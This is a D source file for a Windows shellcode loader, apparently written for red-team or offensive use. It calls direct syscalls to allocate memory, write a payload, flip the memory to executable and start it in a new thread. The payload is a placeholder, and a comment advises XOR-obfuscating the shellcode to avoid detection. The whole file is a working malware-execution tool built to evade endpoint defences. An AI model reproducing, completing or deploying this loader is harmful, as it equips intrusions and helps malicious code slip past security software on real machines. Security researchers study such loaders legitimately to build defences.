import std.stdio;
import core.sys.windows.windows;
import core.sys.windows.winbase;
//adding cstom import so we can compile 
import syscalls;

alias NTSTATUS = uint;
HANDLE NtCurrentProcess = cast(HANDLE)-1;

BOOL NT_SUCCESS(NTSTATUS status) {
    return (status >= 0);
}

void main() {

    // you can also add xored shellcode lol, but you gotta add decryption at runtime for it
    string shellcode = "your shc here";
    populateSyscallEntries();

    PVOID shellcodeBuffer = null;
    NTSTATUS status;
    
    SIZE_T shellcodeSize = shellcode.length;  

    status = NtAllocateVirtualMemory(NtCurrentProcess, &shellcodeBuffer, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (NT_SUCCESS(status)) {
        writefln("[+] Allocated Memory Address: 0x%x", shellcodeBuffer);
    } else {
        writefln("[-] Failed To Allocate Memory, Status: 0x%x", status);
        return;
    }

    SIZE_T bytesWritten = 0;
    auto shellcodeBufferPtr = cast(void*) shellcode.ptr; 
    
    status = NtWriteVirtualMemory(NtCurrentProcess, shellcodeBuffer, shellcodeBufferPtr, shellcodeSize, &bytesWritten);

    if (NT_SUCCESS(status)) {
        writefln("[+] Wrote %d Bytes To Memory Address", bytesWritten);
    } else {
        writefln("[-] Failed To Write To Memory, Status: 0x%x", status);
        return;
    }

    ULONG oldProtection = 0;
    status = NtProtectVirtualMemory(NtCurrentProcess, &shellcodeBuffer, cast(PULONG)&shellcodeSize, PAGE_EXECUTE_READ, &oldProtection);

    if (NT_SUCCESS(status)) {
        writefln("[+] Changed Memory Protection To RX");
    } else {
        writefln("[-] Failed To Change Memory Protection To RX, Status: 0x%x", status);
        return;
    }

    HANDLE createdThread = NULL;
    status = NtCreateThreadEx(&createdThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess, shellcodeBuffer, NULL, FALSE, 0, 0, 0, NULL);

    if (NT_SUCCESS(status)) {
        writefln("[+] Created Thread!");
    } else {
        writefln("[-] Failed To Create Thread, Status: 0x%x", status);
        return;
    }

    status = NtWaitForSingleObject(createdThread, FALSE, NULL);

    if (NT_SUCCESS(status)) {
        writefln("[+] Injected Shellcode Successfully!");
    } else {
        writefln("[-] Failed To Inject ShellCode, Status: 0x%x", status);
        return;
    }
}